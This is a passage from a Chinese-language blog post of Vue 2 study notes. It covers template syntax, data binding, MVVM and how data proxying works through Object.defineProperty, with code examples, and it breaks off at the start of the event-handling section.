href="#1-%E4%BB%80%E9%BA%BC%E6%98%AF%E8%B7%AF%E7%94%B1"><span class="toc-text">1. 什麼是路由</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1%E5%88%86%E7%B1%BB"><span class="toc-text">2.  路由分类</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">4.2 基本使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E5%87%A0%E4%B8%AA%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-text">4.2 几个注意点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3-%E5%A4%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%EF%BC%88%E5%B5%8C%E5%A5%97%E8%B7%AF%E7%94%B1%EF%BC%89"><span class="toc-text">4.3 多级路由（嵌套路由）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-%E8%B7%AF%E7%94%B1%E7%9A%84query%E5%8F%82%E6%95%B0"><span class="toc-text">4.4 路由的query参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-5-%E5%91%BD%E5%90%8D%E8%B7%AF%E7%94%B1"><span class="toc-text">4.5 命名路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-6-%E8%B7%AF%E7%94%B1%E7%9A%84params%E5%8F%82%E6%95%B0"><span class="toc-text">4.6 路由的params参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-7-%E8%B7%AF%E7%94%B1%E7%9A%84props%E9%85%8D%E7%BD%AE"><span class="toc-text">4.7 路由的props配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-8-lt-router-link-gt-%E7%9A%84replace%E5%B1%9E%E6%80%A7"><span class="toc-text">4.8 &lt;router-link&gt;的replace属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-9-%E7%BC%96%E7%A8%8B%E5%BC%8F%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%88%AA"><span class="toc-text">4.9 编程式路由导航</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-10-%E7%BC%93%E5%AD%98%E8%B7%AF%E7%94%B1%E7%BB%84%E4%BB%B6"><span class="toc-text">4.10 缓存路由组件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-11-%E4%B8%A4%E4%B8%AA%E6%96%B0%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90"><span class="toc-text">4.11 两个新的生命周期钩子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-12-%E8%B7%AF%E7%94%B1%E5%AE%88%E5%8D%AB"><span class="toc-text">4.12 路由守卫</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-12-1-%E5%85%A8%E5%B1%80%E5%AE%88%E5%8D%AB"><span class="toc-text">4.12.1 全局守卫:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-12-2-%E7%8B%AC%E4%BA%AB%E5%AE%88%E5%8D%AB"><span class="toc-text">4.12.2 独享守卫:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-12-3-%E7%BB%84%E4%BB%B6%E5%86%85%E5%AE%88%E5%8D%AB%EF%BC%9A"><span class="toc-text">4.12.3 组件内守卫：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-13-%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F"><span class="toc-text">4.13 路由器的两种工作模式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-Vue-UI-%E7%BB%84%E4%BB%B6%E5%BA%93"><span class="toc-text">5. Vue UI 组件库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%B8%B8%E7%94%A8-UI-%E7%BB%84%E4%BB%B6%E5%BA%93"><span class="toc-text">5.1 移动端常用 UI 组件库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-PC-%E7%AB%AF%E5%B8%B8%E7%94%A8-UI-%E7%BB%84%E4%BB%B6%E5%BA%93"><span class="toc-text">5.2 PC 端常用 UI 组件库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#triangular-flag-on-post-Vue3-%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B"><span class="toc-text">:triangular_flag_on_post: Vue3 快速上手</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%AE%80%E4%BB%8B"><span class="toc-text">1. 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E6%80%A7%E8%83%BD%E7%9A%84%E6%8F%90%E5%8D%87"><span class="toc-text">1.1 性能的提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E6%BA%90%E7%A0%81%E7%9A%84%E5%8D%87%E7%BA%A7"><span class="toc-text">1.2 源码的升级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E6%8B%A5%E6%8A%B1TypeScript"><span class="toc-text">1.3 拥抱TypeScript</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-%E6%96%B0%E7%9A%84%E7%89%B9%E6%80%A7"><span class="toc-text">1.4 新的特性</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAVue%E9%A1%B9%E7%9B%AE"><span class="toc-text">2. 创建一个Vue项目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E4%BD%BF%E7%94%A8-vue-cli-%E5%88%9B%E5%BB%BA"><span class="toc-text">2.1 使用 vue-cli 创建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E4%BD%BF%E7%94%A8-vite-%E5%88%9B%E5%BB%BA-%E4%BA%86%E8%A7%A3"><span class="toc-text">2.2 使用 vite 创建 (了解)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E5%88%86%E6%9E%90%E5%B7%A5%E7%A8%8B%E7%B5%90%E6%A7%8B"><span class="toc-text">2.3 分析工程結構</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-main-js"><span class="toc-text">2.3.1 main.js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-2-App-vue"><span class="toc-text">2.3.2 App.vue</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%B8%B8%E7%94%A8-Composition-API"><span class="toc-text">3. 常用 Composition API</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E6%8B%89%E5%BC%80%E5%BA%8F%E5%B9%95%E7%9A%84setup"><span class="toc-text">3.1 拉开序幕的setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-ref%E5%87%BD%E6%95%B0"><span class="toc-text">3.2 ref函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-reactive%E5%87%BD%E6%95%B0"><span class="toc-text">3.3 reactive函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-Vue3-0%E4%B8%AD%E7%9A%84%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86"><span class="toc-text">3.4 Vue3.0中的响应式原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-1-vue2-x%E7%9A%84%E5%93%8D%E5%BA%94%E5%BC%8F"><span class="toc-text">3.4.1 vue2.x的响应式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-2-Vue3-0%E7%9A%84%E5%93%8D%E5%BA%94%E5%BC%8F"><span class="toc-text">3.4.2 Vue3.0的响应式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-reactive%E5%AF%B9%E6%AF%94ref"><span class="toc-text">3.5 reactive对比ref</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-setup%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-text">3.6 setup的两个注意点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E4%B8%8E%E7%9B%91%E8%A7%86"><span class="toc-text">3.7 计算属性与监视</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-1-computed%E5%87%BD%E6%95%B0"><span class="toc-text">3.7.1 computed函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-2-watch%E5%87%BD%E6%95%B0"><span class="toc-text">3.7.2 watch函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-3-watchEffect%E5%87%BD%E6%95%B0"><span class="toc-text">3.7.3 watchEffect函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">3.8 生命周期</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-9-%E8%87%AA%E5%AE%9A%E4%B9%89hook%E5%87%BD%E6%95%B0"><span class="toc-text">3.9 自定义hook函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-10-toRef"><span class="toc-text">3.10 toRef</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%85%B6%E5%AE%83-Composition-API"><span class="toc-text">三、其它 Composition API</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-shallowReactive-%E4%B8%8E-shallowRef"><span class="toc-text">1.shallowReactive 与 shallowRef</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-readonly-%E4%B8%8E-shallowReadonly"><span class="toc-text">2.readonly 与 shallowReadonly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-toRaw-%E4%B8%8E-markRaw"><span class="toc-text">3.toRaw 与 markRaw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-customRef"><span class="toc-text">4.customRef</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-provide-%E4%B8%8E-inject"><span class="toc-text">5.provide 与 inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%93%8D%E5%BA%94%E5%BC%8F%E6%95%B0%E6%8D%AE%E7%9A%84%E5%88%A4%E6%96%AD"><span class="toc-text">6.响应式数据的判断</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Composition-API-%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="toc-text">四、Composition API 的优势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Options-API-%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">1.Options API 存在的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Composition-API-%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="toc-text">2.Composition API 的优势</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%96%B0%E7%9A%84%E7%BB%84%E4%BB%B6"><span class="toc-text">五、新的组件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Fragment"><span class="toc-text">1.Fragment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Teleport"><span class="toc-text">2.Teleport</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Suspense"><span class="toc-text">3.Suspense</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%85%B6%E4%BB%96"><span class="toc-text">六、其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%85%A8%E5%B1%80API%E7%9A%84%E8%BD%AC%E7%A7%BB"><span class="toc-text">1.全局API的转移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%85%B6%E4%BB%96%E6%94%B9%E5%8F%98"><span class="toc-text">2.其他改变</span></a></li></ol></li></ol></div></p>
<hr></hr>
# :triangular_flag_on_post: Vue2 基础用法&基础原理整理

<h1 id="1-vue基础知识和原理"><a href="#1-vue基础知识和原理" class="headerlink" title="1. vue基础知识和原理"></a>1. vue基础知识和原理</h1><h2 id="1-1-初识Vue"><a href="#1-1-初识Vue" class="headerlink" title="1.1 初识Vue"></a>1.1 初识Vue</h2><ul>
<li>想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象</li>
<li>demo容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法</li>
<li>demo容器里的代码被称为【Vue模板】</li>
<li>Vue实例和容器是一一对应的 (一對一)</li>
<li>真实开发中只有一个Vue实例，并且会配合着组件一起使用</li>
<li>是Vue的语法：插值表达式，可以读取到data中的所有属性</li>
<li>一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新(Vue实现的响应式)</li>
</ul>
<blockquote>
<p>注意區分：js表達式 和 js代碼(語句)</p>
<ol>
<li><p>表達式：一個表達式會產生一個值，可以放在任何一個需要值的地方：</p>
<ul>
<li>a</li>
<li>a+b</li>
<li>demo(1)</li>
<li>x === y ? ‘a’ ： ‘b’</li>
</ul>
</li>
<li><p>js代碼(語句)</p>
<ul>
<li>if(){}</li>
<li>for(){}</li>
</ul>
</li>
</ol>
</blockquote>
<blockquote>
<p>初始示例代码</p>
</blockquote>
<pre><code class="html">&lt;!-- 准备好一个容器 --&gt;
&lt;div id=&quot;demo&quot;&gt;
    &lt;h1&gt;Hello，&#123;&#123;name.toUpperCase()&#125;&#125;，&#123;&#123;address&#125;&#125;&lt;/h1&gt;
&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot; &gt;
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

    //创建Vue实例
    new Vue(&#123;
        el:&#39;#demo&#39;, //el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。
        data:&#123; //data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。
            name:&#39;hello,world&#39;,
            address:&#39;北京&#39;
        &#125;
    &#125;);
&lt;/script&gt;
</code></pre>
<h2 id="1-2-模板语法"><a href="#1-2-模板语法" class="headerlink" title="1.2 模板语法"></a>1.2 模板语法</h2><p>Vue模板语法有2大类:</p>
<ul>
<li><p>插值语法：</p>
<p>功能：用于解析标签体内容</p>
<p>写法：，xxx是js表达式，且可以直接读取到data中的所有属性</p>
</li>
<li><p>指令语法:</p>
<p>功能：用于解析标签（包括：标签属性、标签体内容、绑定事件…..）</p>
<p>举例：v-bind:href=”xxx” 或  简写为 :href=”xxx”，xxx同样要写js表达式，且可以直接读取到data中的所有属性</p>
<p>備註：Vue中有很多的指令，其形式都是v-xxx，此處只是以v-bind舉例</p>
</li>
</ul>
<blockquote>
<p>代码</p>
</blockquote>
<pre><code class="html">&lt;div id=&quot;root&quot;&gt;
    &lt;h1&gt;插值语法&lt;/h1&gt;
    &lt;h3&gt;你好，&#123;&#123;name&#125;&#125;&lt;/h3&gt;
    &lt;hr/&gt;
    &lt;h1&gt;指令语法&lt;/h1&gt;
    &lt;!-- 这里是展示被Vue指令绑定的属性，引号内写的是js表达式 --&gt;
    &lt;a :href=&quot;school.url.toUpperCase()&quot; x=&quot;hello&quot;&gt;点我去&#123;&#123;school.name&#125;&#125;学习1&lt;/a&gt;
    &lt;a :href=&quot;school.url&quot; x=&quot;hello&quot;&gt;点我去&#123;&#123;school.name&#125;&#125;学习2&lt;/a&gt;
&lt;/div&gt;

&lt;script&gt;
    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            name:&#39;jack&#39;,
            school:&#123;
                name:&#39;百度&#39;,
                url:&#39;http://www.baidu.com&#39;,
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h2 id="1-3-数据绑定"><a href="#1-3-数据绑定" class="headerlink" title="1.3 数据绑定"></a>1.3 数据绑定</h2><p>Vue中有2种数据绑定的方式：</p>
<ul>
<li><p>单向绑定(v-bind)：数据只能从data流向页面</p>
</li>
<li><p>双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data</p>
<blockquote>
<p>tips:</p>
<p>1.双向绑定一般都应用在表单类元素上（如：input、select等）</p>
<p>2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值</p>
<blockquote>
<p>v-model只能應用在表單類元素(輸入類元素)上</p>
</blockquote>
</blockquote>
</li>
</ul>
<blockquote>
<p>代码</p>
</blockquote>
<pre><code class="html">&lt;div id=&quot;root&quot;&gt;
    &lt;!-- 普通写法 单向数据绑定 --&gt;
    单向数据绑定：&lt;input type=&quot;text&quot; v-bind:value=&quot;name&quot;&gt;&lt;br/&gt;
    双向数据绑定：&lt;input type=&quot;text&quot; v-model:value=&quot;name&quot;&gt;&lt;br/&gt;

    &lt;!-- 简写 v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值--&gt;
    单向数据绑定：&lt;input type=&quot;text&quot; :value=&quot;name&quot;&gt;&lt;br/&gt;
    双向数据绑定：&lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;&lt;br/&gt;
&lt;/div&gt;

&lt;script&gt;
    new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            name:&#39;jack&#39;,
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h2 id="1-4-el与data的两种写法"><a href="#1-4-el与data的两种写法" class="headerlink" title="1.4 el与data的两种写法"></a>1.4 el与data的两种写法</h2><p>el有2种写法</p>
<ul>
<li><p>new Vue时候配置el属性</p>
</li>
<li><p>先创建Vue实例，随后再通过vm.$mount(‘#root’)指定el的值</p>
</li>
</ul>
<blockquote>
<p>代码</p>
</blockquote>
<pre><code class="html">&lt;script&gt;
       // 第一种 
    const vm = new Vue(&#123;
        el:&#39;#root&#39;,
        data:&#123;
            name:&#39;jack&#39;,
        &#125;
    &#125;)

    // 第二种
    vm.$mount(&#39;#root&#39;)
&lt;/script&gt;
</code></pre>
<p>data有2种写法</p>
<ul>
<li><p>对象式</p>
</li>
<li><p>函数式</p>
<blockquote>
<p>在组件中，data必须使用函数式</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>代码</p>
</blockquote>
<pre><code class="html">&lt;script&gt;
    new Vue(&#123;
        el:&#39;#root&#39;,
        // 第一种
        data:&#123;
            name:&#39;jack&#39;,
        &#125;

        // 第二种
        //data:function()&#123; 通常縮寫如下
        data() &#123;
            return &#123;
                name: &#39;jack&#39;
            &#125;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<h2 id="1-5-Vue中的MVVM"><a href="#1-5-Vue中的MVVM" class="headerlink" title="1.5 Vue中的MVVM"></a>1.5 Vue中的MVVM</h2><ul>
<li>M：模型(Model) ：data中的数据</li>
<li>V：视图(View) ：模板代码</li>
<li>VM：视图模型(ViewModel)：Vue实例對象</li>
</ul>
<blockquote>
<p>觀察發現：</p>
<ol>
<li>data中所有的屬性，最後都出現在vm身上</li>
<li>vm身上的所有屬性及Vue原型上所有屬性，在Vue模板中都可以直接使用</li>
</ol>
</blockquote>
<img src="image-20230406021433800.png" alt="image-20230406021433800" style="zoom: 50%;" />



<h2 id="1-6-数据代理"><a href="#1-6-数据代理" class="headerlink" title="1.6 数据代理"></a>1.6 数据代理</h2><p>可直接看<a href="#**:bulb:%E5%B0%8F%E7%B5%90%EF%BC%9A**">小結</a></p>
<blockquote>
<p>了解数据代理需要js的一些知识：Object.defineProperty()，属性标志，属性描述符，getter，setter。。。</p>
</blockquote>
<p>建议学习文章地址：</p>
<p><a target="_blank" rel="noopener" href="https://zh.javascript.info/property-descriptors">https://zh.javascript.info/property-descriptors</a></p>
<p><a target="_blank" rel="noopener" href="https://zh.javascript.info/property-accessors">https://zh.javascript.info/property-accessors</a></p>
<p>这里简单介绍一下：</p>
<p><strong>属性标志</strong>:</p>
<p>对象属性（properties），除 <strong><code>value</code></strong> 外，还有三个特殊的特性（attributes），也就是所谓的“标志”</p>
<ul>
<li><strong><code>writable</code></strong> — 如果为 <code>true</code>，则值可以被修改，否则它是只可读的</li>
<li><strong><code>enumerable</code></strong> — 如果为 <code>true</code>，则表示是可以遍历的，可以在for.. .in   Object.keys()中遍历出来</li>
<li><strong><code>configurable</code></strong> — 如果为 <code>true</code>，则此属性可以被删除，这些特性也可以被修改，否则不可以</li>
</ul>
<p><strong>Object.getOwnPropertyDescriptor(obj, propertyName)</strong></p>
<blockquote>
<p>这个方法是查询有关属性的完整信息 obj是对象， propertyName是属性名</p>
</blockquote>
<pre><code class="js">let user = &#123;
  name: &quot;John&quot;
&#125;;

let descriptor = Object.getOwnPropertyDescriptor(user, &#39;name&#39;);


console.log(descriptor)

/* 属性描述符：
&#123;
  &quot;value&quot;: &quot;John&quot;,
  &quot;writable&quot;: true,
  &quot;enumerable&quot;: true,
  &quot;configurable&quot;: true
&#125;
*/
</code></pre>
<blockquote>
<p>打印结果</p>
</blockquote>
<img src="image-20230406100449407.png" style="border: 5px solid orange;" />



<p><strong>Object.defineProperty</strong>(obj, prop, descriptor)</p>
<blockquote>
<p>obj：要定义属性的对象。</p>
<p>prop：要定义或修改的属性的名称</p>
<p>descriptor：要定义或修改的属性描述符</p>
</blockquote>
<pre><code class="js">let user = &#123;
  name: &quot;John&quot;
&#125;;

Object.defineProperty(user, &quot;name&quot;, &#123;
  writable: false
&#125;);

user.name = &quot;Pete&quot;;

// 打印后还是显示 &#39;John&#39;,无法修改name值
</code></pre>
<p>其他的属性标志就不演示了，接下来看重点：访问器属性。</p>
<p><strong>访问器属性：</strong></p>
<p>本质上是用于获取和设置值的函数，但从外部代码来看就像常规属性。</p>
<p>访问器属性由 “getter” 和 “setter” 方法表示。在对象字面量中，它们用 <code>get</code> 和 <code>set</code> 表示：</p>
<pre><code class="js">let obj = &#123;
    get name() &#123;
        // 当读取 obj.propName 时，getter 起作用
    &#125;,
    set name() &#123;
        // 当执行 obj.name = value 操作时，setter 起作用
    &#125;
&#125;
</code></pre>
<p><strong>更复杂一点的使用</strong></p>
<pre><code class="js">let user = &#123;
    surname: &#39;gao&#39;,
    name: &#39;han&#39;

    get fullName() &#123;
        return this.name + this.surname;
    &#125;
&#125;

console.log(user.fullName)
</code></pre>
<p>从外表看，访问器属性看起来就像一个普通属性。这就是访问器属性的设计思想。我们不以函数的方式 <strong>调用</strong> <code>user.fullName</code>，我们正常 <strong>读取</strong> 它：getter 在幕后运行。</p>
<blockquote>
<p>vue的计算属性的底层构造感觉用到了这种思想，我目前还没看过源码，是这样猜想的。</p>
</blockquote>
<p>截至目前，<code>fullName</code> 只有一个 getter。如果我们尝试赋值操作 <code>user.fullName=</code>，将会出现错误：</p>
<pre><code class="js">user.fullName = &quot;Test&quot;; // Error（属性只有一个 getter）
</code></pre>
<p>为 <code>user.fullName</code> 添加一个 setter 来修复它：</p>
<pre><code class="js">let user = &#123;
    surname: &#39;gao&#39;,
    name: &#39;han&#39;

    get fullName() &#123;
        return this.name + &#39; &#39; + this.surname;
    &#125;

    set fullName(value) &#123;
        // 这个用到了新语法 结构赋值
        [this.surname, this.name] = value.split(&#39; &#39;);
    &#125;
&#125;

user.fullName = &#39;Li Hua&#39;

console.log(user.name);
console.log(user.surname);
</code></pre>
<p><strong>终于可以介绍数据代理了</strong>：</p>
<p>数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）</p>
<p>先来看个案例：</p>
<pre><code class="js">let obj = &#123;
    x: 100
&#125;

let obj2 = &#123;
    y: 200
&#125;
</code></pre>
<p>这时候提一个需求：我们想要访问 <strong>obj</strong> 中的 <strong>x</strong> 的值，但我们最好不要直接去访问 <strong>obj</strong> ,而是想要通过 <strong>obj2</strong> 这个代理对象去访问。</p>
<p>这时候就可以用上 **Object.defineProperty()**，给 <strong>obj2</strong> 添加上访问器属性（也就是getter和setter）</p>
<blockquote>
<p>代码</p>
</blockquote>
<pre><code class="js">let obj = &#123;
    x: 100
&#125;

let obj2 = &#123;
    y: 200
&#125;

Object.defineProperty(obj2, &#39;x&#39;, &#123;
    get() &#123;
        return obj.x;
    &#125;,
    set(value) &#123;
        obj.x = value;
    &#125;
&#125;)
</code></pre>
<blockquote>
<p>这就是数据代理，也不难吧</p>
</blockquote>
<p><strong>接下来介绍Vue中的数据代理</strong></p>
<ul>
<li>Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）</li>
<li>Vue中数据代理的好处：更加方便的操作data中的数据</li>
<li>基本原理：<ul>
<li>通过Object.defineProperty()把data对象中所有属性添加到vm上。</li>
<li>为每一个添加到vm上的属性，都指定一个getter/setter。</li>
<li>在getter/setter内部去操作（读/写）data中对应的属性。</li>
</ul>
</li>
</ul>
<p>我来用一个案例来详细解释这一个过程。</p>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;
    &lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;
&lt;/div&gt;

&lt;script&gt;
    const vm = new Vue(&#123;
        el: &#39;#root&#39;,
        data: &#123;
            name: &#39;浙江师范大学&#39;,
            address: &#39;浙江金华&#39;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<p>我们在控制台打印 new 出来的 vm</p>
<img src="image-20230406100457984.png" alt="image-20230406100457984" style="border: 5px solid orange;" />

<p>可以看到，写在配置项中的 data 数据被 绑定到了 vm 对象上，我先来讲结果，是 Vue 将 _data 中的 name，address 数据 代理到 vm 本身上。</p>
<blockquote>
<p>一脸懵逼？</p>
</blockquote>
<p>先来解释下_data 是啥， _data 就是 vm 身上的 _data 属性，就是下图那个</p>
<img src="image-20230406100502994.png" alt="image-20230406100502994" style="border: 5px solid orange;" />

<p>这个 _data 是从哪来的？</p>
<pre><code class="html">&lt;script&gt;

    const vm = new Vue(&#123;
        el: &#39;#root&#39;,
        // 我们在Vue 初始化的配置项中写了 data 属性。
        data: &#123;
            name: &#39;浙江师范大学&#39;,
            address: &#39;浙江金华&#39;
        &#125;
    &#125;)
&lt;/script&gt;
</code></pre>
<p>new Vue 时， Vue 通过一系列处理， 将匹配项上的 data 数据绑定到了 _data 这个属性上，并对这个属性进行了处理（数据劫持），但这个属性就是来源于配置项中的 data，我们可以来验证一下。</p>
<pre><code class="html">&lt;script&gt;

    let data1 = &#123;
        name: &#39;浙江师范大学&#39;,
        address: &#39;浙江金华&#39;
    &#125;

    const vm = new Vue(&#123;
        el: &#39;#root&#39;,
        // 我们在Vue 初始化的配置项中写了 data 属性。
        data: data1
    &#125;)
&lt;/script&gt;
</code></pre>
<img src="image-20230406100510745.png" alt="image-20230406100510745" style="border: 5px solid orange;" />

<blockquote>
<p>打印结果为true，说明两者就是同一个</p>
</blockquote>
<p>好了，再回到数据代理上来，将 <strong>vm._data</strong> 中的值，再代理到 vm 本身上来，用vm.name 代替 <strong>vm._data.name</strong>。这就是 Vue 的数据代理</p>
<img src="image-20230406100518965.png" alt="image-20230406100518965" style="border: 5px solid orange;" />

<p>这一切都是通过 Object.defineProperty() 来完成的，我来模拟一下这个过程</p>
<pre><code class="js">Object.defineProperty(vm, &#39;name&#39;, &#123;
    get() &#123;
        return vm._data.name;
    &#125;,
    set(value) &#123;
        vm._data.name = value
    &#125;
&#125;)
</code></pre>
<blockquote>
<p>这样有啥意义？明明通过 vm._data.name 也可以访问 name 的值，为啥费力去这样操作？</p>
</blockquote>
<p>在插值语法中， 取到的值就相当于 ，不用数据代理的话，在插值语法就要这样去写了。</p>
 这不符合直觉，怪怪的。vue 这样设计更利于开发者开发



<p><img src="/2023/04/17/15_Vue%E7%AD%86%E8%A8%98/image-20230406100523934.png" alt="image-20230406100523934"></p>
<h4 id="bulb-小結："><a href="#bulb-小結：" class="headerlink" title=":bulb:小結："></a><strong>:bulb:小結：</strong></h4><ol>
<li>Vue中的數據代理：<ul>
<li>通過vm對象來代理data對象中屬性的操作(讀/寫)</li>
</ul>
</li>
<li>Vue中數據代理的好處：<ul>
<li>更加方便的操作data中的數據</li>
</ul>
</li>
<li>基本原理：<ul>
<li>通過Object.defineProperty() 把data對象中所有的屬性添加到vm上。為每一個添加到vm上的屬性，都指定一個getter/setter。在getter/setter內部去操作(讀/寫)data中對應的屬性。</li>
</ul>
</li>
</ol>
<h2 id="1-7-事件处理"><a href="#1-7-事件处理" class="headerlink" title="1.7 事件处理"></a>1.7 事件处理</h2><p>事件的基本使用：</p>
<ul>
<li>使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名</li>
<li>事件的回调需要配置在methods对象中，最终会在vm上</li>
<li>methods中配置的函數，不要用箭頭函數! 否則this就不是vm了</li>
<li>methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象</li>
<li>@click=”demo” 和 @click=”demo($event)” 效果一致，但後者可以傳參</li>
</ul>
<pre><code class="html">&lt;!-- 准备好一个容器--&gt;
&lt;div id=&quot;root&quot;&gt;
    &lt;h2&gt;欢迎来到&#123;&#123;name&#125;&#125;学习&lt;/h2&gt;
    &lt;!-- &lt;button v-on:click=&quot;showInfo&quot;&gt;点我提示信息&lt;/button&gt; --&gt;
